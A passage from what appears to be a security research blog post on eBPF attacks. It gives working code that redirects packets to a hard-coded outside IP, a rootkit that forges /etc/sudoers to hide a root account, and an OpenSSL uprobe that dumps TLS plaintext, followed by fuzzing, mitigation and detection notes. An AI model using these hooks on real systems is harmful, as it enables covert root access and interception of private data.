        <span>//</span> check <span>if</span> dst port is <span>0x1337</span>
        <span>if</span> (dst_port == <span>0x1337</span>)
        {
            <span>//</span> modify dest port to <span>1234</span>
            u16 new_dst_port = bpf_htons(<span>1234</span>);
            bpf_skb_store_bytes(skb, sizeof(struct ethhdr) + sizeof(struct iphdr) + offsetof(struct tcphdr, dest), &amp;new_dst_port, sizeof(new_dst_port), BPF_F_RECOMPUTE_CSUM);

            <span>//</span> modify dest addr to <span>15.204</span>.<span>197.177</span>
            u32 new_dst_addr = bpf_htonl(<span>0x0FC4C5B1</span>);
            bpf_skb_store_bytes(skb, sizeof(struct ethhdr) + offsetof(struct iphdr, daddr), &amp;new_dst_addr, sizeof(new_dst_addr), BPF_F_RECOMPUTE_CSUM);

            iph = (struct iphdr *)(skb-&gt;data + sizeof(struct ethhdr));
            <span>if</span> ((void *)(iph + <span>1</span>) &gt; skb-&gt;data_end)
            {
                <span>return</span> TC_ACT_OK;
            }

            struct tcphdr *tcph = (struct tcphdr *)(iph + <span>1</span>);
            <span>if</span> ((void *)(tcph + <span>1</span>) &gt; skb-&gt;data_end)
            {
                <span>return</span> TC_ACT_OK;
            }

            dst_port = bpf_htons(tcph-&gt;dest);
            dst_addr = bpf_htonl(iph-&gt;daddr);
        }
    }
}
</code></span><small id="shcb-language-25"><span>Code language:</span> <span>Perl</span> <span>(</span><span>perl</span><span>)</span></small></pre>


<p>Just remember to update the checksums after modifying the packet, otherwise the packet will be dropped by the kernel.</p>



<p>To detect such attacks, it is sufficient to use external monitoring tools or hardware since once the packet has been processed by the kernel it’s possible to see the actual destination of the packet.</p>



<h4>Sudoers hidden root account</h4>



<p>Creating a hidden user is a neat feature when it comes to hiding malicious behaviors. This can be achieved by using eBPF to hook <code>SYS_open</code> and <code>SYS_read</code> syscalls, and then by crafting a custom entry inside <strong>/etc/sudoers</strong> file when sudo tries to read it. The code below is just an example of how such capabilities can be achieved.</p>



<p>In order to do so, we created three different kprobes: one on <code>SYS_openat2,</code> one on <code>SYS_read,</code> and one on <code>SYS_exit</code>. The logic is as follows:</p>



<p>1 – when <code>SYS_openat2</code> is called, we save the file descriptor of <strong>/etc/sudoers</strong> and the calling process pid inside a map.</p>



<p>2 – when <code>SYS_read</code> is called, we check if the file descriptor is the one we saved before; if so, we save the destination buffer inside the map.</p>



<p>3 – when <code>SYS_exit</code> is called, we check if the process pid is present inside our map; if so, we close the file descriptor and remove it from our map to prevent race conditions when two processes have the same fd number.</p>



<p>The final code looks like this:</p>


<pre aria-describedby="shcb-language-26" data-shcb-language-name="Perl" data-shcb-language-slug="perl"><span><code>



​




​
SEC(<span>&#34;kprobe/do_sys_openat2&#34;</span>)
<span>int</span> kprobe__do_sys_openat2(struct pt_regs *ctx) {
   struct filename *filename;
   bpf_probe_read(&amp;filename, sizeof(filename), &amp;ctx-&gt;si);
​
   char name[<span>256</span>];
   bpf_probe_read_str(name, sizeof(name), &amp;filename-&gt;name);
​
   <span>if</span> (strcmp(name, <span>&#34;/etc/sudoers&#34;</span>) == true) {
       size_t pt = bpf_get_current_pid_tgid();
       <span>//</span> first <span>write</span> fd = -<span>1</span> to the <span>map</span> as we are currently at the start of the function
       // <span>and</span> we don<span>&#39;t know the value of it yet, we also don&#39;</span>t know the destination buffer
       // <span>until</span> kprobe/ksys_read, so set it to NULL <span>for</span> now
       struct fd_dest fdest = { .fd = -<span>1</span>, .dest = NULL };
​
       bpf_map_update_elem(&amp;sudoers_map, &amp;pt, &amp;fdest, BPF_NOEXIST);
   }
​
   <span>return</span> <span>0</span>;
}
​
SEC(<span>&#34;kretprobe/do_sys_openat2&#34;</span>)
<span>int</span> kretprobe__do_sys_openat2(struct pt_regs *ctx) {
   struct fd_dest fdest;
   size_t pt = bpf_get_current_pid_tgid();
​
   void *val = bpf_map_lookup_elem(&amp;sudoers_map, &amp;pt);
   <span>if</span> (val == NULL)
       <span>return</span> <span>0</span>;
​
   bpf_probe_read(&amp;fdest, sizeof(fdest), val);
   <span>//</span> check <span>if</span> we already saved the fd of /etc/sudoers to the <span>map</span>
   <span>if</span> (fdest.fd != -<span>1</span>)
       <span>return</span> <span>0</span>;
​
   // <span>read</span> the rax value, which contains the fd of the opened file
   bpf_probe_read(&amp;fdest.fd, sizeof(fdest.fd), &amp;ctx-&gt;ax);
​
   // update fd from -<span>1</span> to the actual fd
   bpf_map_update_elem(&amp;sudoers_map, &amp;pt, &amp;fdest, BPF_EXIST);
​
   <span>return</span> <span>0</span>;
}
​
SEC(<span>&#34;kprobe/ksys_read&#34;</span>)
<span>int</span> kprobe__ksys_read(struct pt_regs *ctx) {
   <span>int</span> fd;
   struct fd_dest fdest;
   void *read_dest = NULL;
   size_t pt = bpf_get_current_pid_tgid();
​
   void *val = bpf_map_lookup_elem(&amp;sudoers_map, &amp;pt);
   <span>if</span> (val == NULL)
       <span>return</span> <span>0</span>;
​
   bpf_probe_read(&amp;fdest, sizeof(fdest), val);
   <span>//</span> <span>if</span> we still haven<span>&#39;t hit kretprobe of do_sys_openat2
   // (the fd of /etc/sudoers is not saved yet)
   // also skip if the destination buffer was already saved
   if (fdest.fd == -1 || fdest.dest != NULL)
       return 0;
​
   bpf_probe_read(&amp;fd, sizeof(fd), &amp;ctx-&gt;di);
   // check if the read fd matches the fd of the /etc/sudoers file
   if (fd != fdest.fd)
       return 0;
​
   // the destination buffer pointer is within rsi register
   // read its value and write it to the map
   bpf_probe_read(&amp;fdest.dest, sizeof(fdest.dest), &amp;ctx-&gt;si);
   bpf_map_update_elem(&amp;sudoers_map, &amp;pt, &amp;fdest, BPF_EXIST);
​
   return 0;
}
​
SEC(&#34;kretprobe/ksys_read&#34;)
int kretprobe__ksys_read(struct pt_regs *ctx) {
   size_t bytes_read = 0;
   struct fd_dest fdest;
   size_t pt = bpf_get_current_pid_tgid();
​
   void *val = bpf_map_lookup_elem(&amp;sudoers_map, &amp;pt);
   if (val == NULL)
       return 0;
​
   bpf_probe_read(&amp;fdest, sizeof(fdest), val);
   if (fdest.dest == NULL)
       return 0;
​
   size_t new_sudoers_len = strlen(NEW_SUDOERS);
​
   bpf_probe_read(&amp;bytes_read, sizeof(bytes_read), &amp;ctx-&gt;ax);
   if (bytes_read == 0 || bytes_read &lt; new_sudoers_len)
       return 0;
​
   // write NEW_SUDOERS to the beginning of the file
   bpf_probe_write_user(fdest.dest, NEW_SUDOERS, new_sudoers_len);
​
   // pad the rest of the /etc/sudoers with PAD_CHAR
   // i &lt; MAX_SUDOERS_SIZE check is needed otherwise the verifier won&#39;</span>t allow
   // the program to load
   char tmp = PAD_CHAR;
   <span>for</span> (u32 i = new_sudoers_len; i &lt; bytes_read &amp;&amp; i &lt; MAX_SUDOERS_SIZE; i++)
       bpf_probe_write_user(fdest.dest + i, &amp;tmp, sizeof(tmp));
​
   <span>return</span> <span>0</span>;
}
​
SEC(<span>&#34;kprobe/do_exit&#34;</span>)
<span>int</span> kprobe__do_exit(struct pt_regs *ctx) {
   size_t pt = bpf_get_current_pid_tgid();
​
   // <span>if</span> the pid_tgid is found within the <span>map</span> then the process that<span>&#39;s currently
   // exiting is a process that previously read /etc/sudoers, remove it from the map
   if (bpf_map_lookup_elem(&amp;sudoers_map, &amp;pt))
       bpf_map_delete_elem(&amp;sudoers_map, &amp;pt);
​
   return 0;
}
</span></code></span><small id="shcb-language-26"><span>Code language:</span> <span>Perl</span> <span>(</span><span>perl</span><span>)</span></small></pre>


<p>The only effective way to defend against this kind of rootkit is to use eBPF to monitor <code>SYS_bpf</code> syscall.</p>



<h4>SSL plaintext dump with Uprobe</h4>



<p>It’s not only syscalls that can be hooked, but also user space functions. This can be done by using uprobes. Uprobe hooking works under the hood by using <code>INT3</code> instructions to set breakpoints on the target function. This means that the binary must be compiled with debug symbols in order to be easily hooked. When the breakpoint is hit, the kernel will invoke the eBPF program and pass the context to it. This context contains the registers and the stack of the target process. This means that the eBPF program can read and write the stack of the target process.</p>



<p>The example below shows how to hook the <code>SSL_write</code> function from OpenSSL and dump the plaintext of the SSL connection.</p>


<pre aria-describedby="shcb-language-27" data-shcb-language-name="Perl" data-shcb-language-slug="perl"><span><code>SEC(<span>&#34;uprobe/SSL_write&#34;</span>)
<span>int</span> uprobe__SSL_write(struct pt_regs *ctx)
{
    size_t len = (size_t)PT_REGS_PARM3(ctx);
    char *buf = (char *)PT_REGS_PARM2(ctx);

    <span>//</span> check <span>if</span> len is greater than <span>0</span>
    <span>if</span> (len &gt; <span>0</span> &amp;&amp; buf != NULL)
    {

        <span>if</span> (len &gt; <span>256</span>)
        {
            len = <span>256</span>;
        }

        bpf_printk(<span>&#34;SSL_write RSI: %p\n&#34;</span>, buf);

        ssl_result_t *res;
        u32 key = <span>0</span>;

        res = bpf_map_lookup_elem(&amp;ssl_results, &amp;key);
        <span>if</span> (!res)
        {
            <span>return</span> <span>0</span>;
        }

        bpf_probe_read_user_str(&amp;res-&gt;msg, len, buf);
        bpf_get_current_comm(&amp;res-&gt;comm, sizeof(res-&gt;comm));
        res-&gt;pid = bpf_get_current_pid_tgid() &gt;&gt; <span>32</span>;
        bpf_perf_event_output(ctx, &amp;ssl_events, BPF_F_CURRENT_CPU, res, sizeof(*res));
    }

    <span>return</span> <span>0</span>;
}</code></span><small id="shcb-language-27"><span>Code language:</span> <span>Perl</span> <span>(</span><span>perl</span><span>)</span></small></pre>


<p><code>SSL_write</code> has the following signature:</p>


<pre aria-describedby="shcb-language-28" data-shcb-language-name="Perl" data-shcb-language-slug="perl"><span><code><span>int</span> SSL_write(SSL *ssl, const void *buf, <span>int</span> num);</code></span><small id="shcb-language-28"><span>Code language:</span> <span>Perl</span> <span>(</span><span>perl</span><span>)</span></small></pre>


<p><code>RSI</code> register will hold the pointer to the buffer containing the data to be sent (plaintext).</p>



<p>Protecting against this kind of attack is trivial, since this will make changes to the <code>.text</code> segment, developers could implement some kind of integrity check (<em>CRC32</em>) to detect if the binary has been modified.</p>



<h2 id="exploitation">eBPF exploitation</h2>



<p>eBPF is the perfect target for hackers. Given the complexity of the verifier, it’s very likely in the near future that some bugs will be found and exploited.</p>



<p>Fuzzing is still the preferred way to find bugs in the kernel, but it’s not easy to fuzz eBPF programs. The verifier is very strict and it’s not easy to generate valid programs. Some clever approaches have been developed to overcome this problem. For example,<a href="https://github.com/google/buzzer"> Buzzer</a> from Google is a fuzzer that uses logs from the verifier itself to generate valid programs, and also KCOV to trace the coverage of the generated samples.</p>



<p>This approach resulted in the discovery of some bugs in the verifier, <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=71b547f561247897a0a14f3082730156c0533fed">CVE-2023-2163</a> for example. Anyway there’s still some room for improvement, like fuzzing the side effects of kernel helper functions. This could be done by better implementing the samples’ generation logic, and, given the small number of instructions supported by the eBPF VM, it’s possible to implement a fuzzer that generates valid programs by using a grammar-based approach.</p>



<p>Also, entirely porting the verifier to userspace could be a good idea. This will allow us to fuzz the verifier itself with the help of assertion to force it to crash when it encounters some invalid assumptions.</p>



<h2 id="mitigation"><strong>Mitigation</strong></h2>



<p>The most effective way to mitigate such attacks is to restrict usage of <code>SYS_bpf </code>to the root user. This can be done by setting the kconfig knob <code>BPF_UNPRIV_DEFAULT_OFF, </code>which is the default at the moment of writing.</p>



<h2 id="conclusion"><strong>Conclusion</strong></h2>



<p>eBPF is a very powerful technology that allows us to extend the kernel functionality in a safe way. It’s used in production by many companies and it’s likely that it will be used even more in the future. But also, threat actors can take advantage of this technology to hide their malicious activities, bypass security checks, and even exploit the kernel.</p>



<p>The best way to deal with those kinds of next-gen attacks is to fully use the power of eBPF to monitor the kernel and detect suspicious activities.</p>



<p>Falco provides a great example of how eBPF can be used to detect malicious activities. Also, Falco supports monitoring eBPF syscall, thus allowing it to detect eBPF exploitation attempts.</p>



<h3>References:</h3>



<ul>
<li><a href="https://github.com/google/buzzer">https://github.com/google/buzzer</a></li>



<li><a href="https://pentera.io/blog/the-good-bad-and-compromisable-aspects-of-linux-ebpf/">https://pentera.io/blog/the-good-bad-and-compromisable-aspects-of-linux-ebpf/</a></li>



<li><a href="https://stdnoerr.github.io/writeup/2022/08/21/eBPF-exploitation-(ft.-D-3CTF-d3bpf).html">https://stdnoerr.github.io/writeup/2022/08/21/eBPF-exploitation-(ft.-D-3CTF-d3bpf).html</a></li>



<li><a href="https://elixir.bootlin.com/linux/v6.4.3/source/kernel/bpf/verifier.c">https://elixir.bootlin.com/linux/v6.4.3/source/kernel/bpf/verifier.c</a></li>



<li><a href="https://ebpf.io/">https://ebpf.io/</a><a href="https://www.collabora.com/news-and-blog/blog/2019/04/15/an-ebpf-overview-part-2-machine-and-bytecode/">https://www.collabora.com/news-and-blog/blog/2019/04/15/an-ebpf-overview-part-2-machine-and-bytecode/</a></li>
</ul>

</div>			</div></div>
  </body>
</html>
